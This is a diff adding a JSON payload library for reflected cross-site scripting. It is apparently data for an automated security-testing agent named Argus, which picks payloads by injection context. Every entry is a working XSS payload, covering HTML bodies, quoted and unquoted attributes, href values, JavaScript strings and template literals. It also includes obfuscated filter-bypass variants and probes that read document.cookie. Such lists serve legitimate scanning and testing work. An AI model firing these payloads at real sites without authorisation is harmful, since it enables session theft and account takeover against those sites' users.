@@ -1,0 +1,139 @@
+{
+  "type": "xss_reflected",
+  "description": "Context-specific payloads for reflected XSS. Agent selects based on injection context.",
+  "contexts": {
+    "html_body": {
+      "description": "Input reflected directly in HTML body (not inside a tag)",
+      "payloads": [
+        "<script>alert(1)</script>",
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
+        "<details open ontoggle=alert(1)>",
+        "<body onload=alert(1)>",
+        "<iframe src=javascript:alert(1)>",
+        "<input autofocus onfocus=alert(1)>",
+        "<video src=x onerror=alert(1)>",
+        "<audio src=x onerror=alert(1)>",
+        "<math href=javascript:alert(1)>test</math>",
+        "<table background=javascript:alert(1)>",
+        "<object data=javascript:alert(1)>",
+        "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "<SCRIPT>alert(1)</SCRIPT>",
+        "<ScRiPt>alert(1)</ScRiPt>"
+      ]
+    },
+    "html_attribute_unquoted": {
+      "description": "Input reflected inside an HTML attribute without quotes: <tag attr=INPUT>",
+      "payloads": [
+        "x onmouseover=alert(1)",
+        "x onfocus=alert(1) autofocus",
+        "x onclick=alert(1)",
+        "x/onmouseover=alert(1)",
+        "x\ttabindex=1\tonfocus=alert(1)",
+        "x onpointerover=alert(1)"
+      ]
+    },
+    "html_attribute_double_quoted": {
+      "description": "Input reflected inside double-quoted attribute: <tag attr=\"INPUT\">",
+      "payloads": [
+        "\" onmouseover=\"alert(1)",
+        "\" onfocus=\"alert(1)\" autofocus=\"",
+        "\" onclick=\"alert(1)",
+        "\"><img src=x onerror=alert(1)>",
+        "\"><script>alert(1)</script>",
+        "\"autofocus onfocus=alert(1) \""
+      ]
+    },
+    "html_attribute_single_quoted": {
+      "description": "Input reflected inside single-quoted attribute: <tag attr='INPUT'>",
+      "payloads": [
+        "' onmouseover='alert(1)",
+        "' onfocus='alert(1)' autofocus='",
+        "' onclick='alert(1)",
+        "'><img src=x onerror=alert(1)>",
+        "'><script>alert(1)</script>"
+      ]
+    },
+    "href_src": {
+      "description": "Input reflected in href= or src= attribute",
+      "payloads": [
+        "javascript:alert(1)",
+        "javascript:alert(document.domain)",
+        "data:text/html,<script>alert(1)</script>",
+        "vbscript:alert(1)",
+        "JAVASCRIPT:alert(1)",
+        "&#106;avascript:alert(1)",
+        "java\nscript:alert(1)",
+        "java\tscript:alert(1)"
+      ]
+    },
+    "javascript_string_single_quoted": {
+      "description": "Input reflected inside a JS string delimited by single quotes: var x='INPUT'",
+      "payloads": [
+        "'-alert(1)-'",
+        "';alert(1)//",
+        "\\';alert(1)//",
+        "'-alert(1)-'",
+        "'+alert(1)+'",
+        "';alert(document.cookie)//"
+      ]
+    },
+    "javascript_string_double_quoted": {
+      "description": "Input reflected inside a JS string delimited by double quotes: var x=\"INPUT\"",
+      "payloads": [
+        "\"-alert(1)-\"",
+        "\";alert(1)//",
+        "\\\";alert(1)//",
+        "\"-alert(1)-\"",
+        "\"+alert(1)+\""
+      ]
+    },
+    "javascript_template_literal": {
+      "description": "Input reflected inside a JS template literal: `text ${INPUT} text`",
+      "payloads": [
+        "${alert(1)}",
+        "`-alert(1)-`",
+        "${eval(atob('YWxlcnQoMSk='))}"
+      ]
+    },
+    "inside_script_tag": {
+      "description": "Input reflected between <script> tags but not inside a string",
+      "payloads": [
+        "alert(1)",
+        "alert(document.domain)",
+        "alert(document.cookie)",
+        "</script><script>alert(1)</script>"
+      ]
+    },
+    "json_response": {
+      "description": "Input reflected in a JSON response used by JavaScript",
+      "payloads": [
+        "\",\"xss\":\"<script>alert(1)</script>",
+        "\\\"}<script>alert(1)</script>",
+        "</script><script>alert(1)</script>"
+      ]
+    }
+  },
+  "canary_tokens": [
+    "argus_xss_test_001",
+    "argus_xss_test_002",
+    "xss_canary_argus"
+  ],
+  "filters_bypass": {
+    "script_tag_filter": [
+      "<img src=x onerror=alert(1)>",
+      "<svg onload=alert(1)>",
+      "<details open ontoggle=alert(1)>"
+    ],
+    "alert_word_filter": [
+      "<img src=x onerror=confirm(1)>",
+      "<img src=x onerror=prompt(1)>",
+      "<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
+      "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>"
+    ],
+    "angle_bracket_filter": [
+      "\" onmouseover=\"alert(1)",
+      "javascript:alert(1)"
+    ]
+  }
+}
